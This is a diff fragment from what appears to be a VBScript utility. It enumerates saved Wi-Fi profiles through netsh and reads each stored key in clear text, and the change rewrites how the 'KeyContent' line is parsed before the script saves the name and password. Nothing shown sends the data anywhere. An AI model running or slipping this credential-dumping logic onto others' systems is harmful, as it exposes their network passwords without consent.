@@ -26,14 +26,19 @@ strText=Split(GetOutput("netsh wlan show profile"), "\n")
 
 i = 0
 
-For Each x in strText 
+For Each x in strText
 	If i > 8 And i < Ubound(strText)-1 Then
 		Name = Split(x, ": ")(1)
-		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")(32)
-		passwd = Split(str, ": ")
-		If Ubound(passwd) Then 
-			saveIt Name, passwd(1)
-		End If
+		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")
+    For Each options in str
+      options=Replace(options, " ", "")
+      If UBound(Split(options, ":")) >= 1 Then
+        If Split(options, ":")(0) = "KeyContent" Then
+          passwd = Split(options, ":")(1)
+          saveIt Name, passwd
+        End If
+      End If
+    Next
 	End If
 	i = i + 1
 Next
